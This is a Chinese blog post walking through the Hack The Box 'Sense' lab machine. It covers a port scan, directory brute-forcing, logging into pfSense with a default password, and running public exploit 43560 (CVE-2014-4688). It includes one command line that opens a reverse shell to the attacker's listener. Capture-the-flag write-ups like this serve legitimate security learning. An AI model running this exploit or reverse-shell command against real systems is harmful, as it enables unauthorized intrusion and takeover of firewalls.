> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yRj5a00KiEgKGEod_kCTLg)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **118** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/9qXnTkZPuxe8H1QicBcbrQQVKOeKw2PsaPtbkhed7icVWmmGk0o3VgYFqKdtNwPFicT2aW803Yp7DqjdiaoFRYVX3A/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/111

靶机难度：初级（2.8/10）

靶机发布日期：2017 年 10 月 22 日

靶机描述：

Sense, while not requiring many steps to complete, can be challenging for some as the proof of concept exploit that is publicly available is very unreliable. An alternate method using the same vulnerability is required to successfully gain access.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/gUVKXuw5icTuicMe1TSd3CYPJzxFcxUnzpBLmOY2lYosbSmH5Ro01bJbqOVUwZ97d098kTPyiaWWicblornticcLu9w/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMvDrN7saaaJ28icObDuwasrIAE1wsrMq3WAm1N6WOvJjHO0Nsht0A8RykRHGIKbXlz9humzhpR9Vg/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.60....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMvDrN7saaaJ28icObDuwasrB6GDAnUJsQJQ8TKe0DmJiar8ANC3lGLuiaJrM6VBytoE8NSu28a6JqDw/640?wx_fmt=png)

Nmap 发现仅开放了 80 和 443 端口...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMvDrN7saaaJ28icObDuwasra4xpxkc5JALK4vyXN9GwVJxfZU1g66OlfQ2GlKKyW7lqFBibH5EJx5A/640?wx_fmt=png)

访问 80 跳转到了 443.... 是个 sense 框架服务页面... 需要知道账号密码... 爆破看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMvDrN7saaaJ28icObDuwasrw15TZwv3YkuIHEStACOuTklROdSBfQ6SOkCDLwNuoKWZHjfCZBvRbQ/640?wx_fmt=png)

通过爆破发现了两个重要的 txt 文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMvDrN7saaaJ28icObDuwasr5VwjibpT6fZGFx2w6t8p0MLVLnPuU6GsR9olu6UGu2KpCGo5ib7zaJVA/640?wx_fmt=png)

文本信息提示已修补 3 个漏洞中的 2 个... 有 EXP 可以利用...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMvDrN7saaaJ28icObDuwasrHn0DAAaAloiaddA0hfvhoKzDKL2QedqCbcUTXicWOMuz7pI3DGtyj9uw/640?wx_fmt=png)

给出了用户名...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMvDrN7saaaJ28icObDuwasrywSJ0ZhjcQwhPMJZ7HMlVdMkCpCUms6bYPSGBRExVFv7EQlLSkz5rw/640?wx_fmt=png)

通过简单搜索到了默认密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMvDrN7saaaJ28icObDuwasryFd3QpdKZ1kZrWD3KCs64sWiaDia7DicFQia2WmzWpQjiawPiabPggyB4M1Q/640?wx_fmt=png)

利用默认密码成功登陆... 框架运行着 pfsense 2.1.3-RELEASE....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMvDrN7saaaJ28icObDuwasrdibWYsOmW8O2docvbAtNibJsia03yYDVDxpBBWFVYqhDiaARoloKomMQAw/640?wx_fmt=png)

直接本地搜索，发现了很多漏洞... 通过 google sense 存在的漏洞可利用 43560EXP...CVE-2014-4688

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMvDrN7saaaJ28icObDuwasr9RV9kQrID4OY6Z0HibYqQ03ExhtMzvNV5LxBpE0lgSK8vXX8ESvPCWQ/640?wx_fmt=png)

查看后发现直接利用即可 EXP.... 不需要修改

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMvDrN7saaaJ28icObDuwasrAOaWyb8VrkoU0XHaAB8BJZ71bMFM9FIrKtONcrT4DNiapY7kcuLJ9vQ/640?wx_fmt=png)

```
python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.51 --lport 6666 --username rohit --password pfsense
```

执行 EXP 成功获得了反向外壳... 获得了 user_flag 和 root_flag 信息.....

![](https://mmbiz.qpic.cn/mmbiz_png/9qXnTkZPuxe8H1QicBcbrQQVKOeKw2PsaPtbkhed7icVWmmGk0o3VgYFqKdtNwPFicT2aW803Yp7DqjdiaoFRYVX3A/640?wx_fmt=png)

这里也可以利用 39709 注入命令提权... 可以尝试下

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台初级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/gUVKXuw5icTuicMe1TSd3CYPJzxFcxUnzpBLmOY2lYosbSmH5Ro01bJbqOVUwZ97d098kTPyiaWWicblornticcLu9w/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)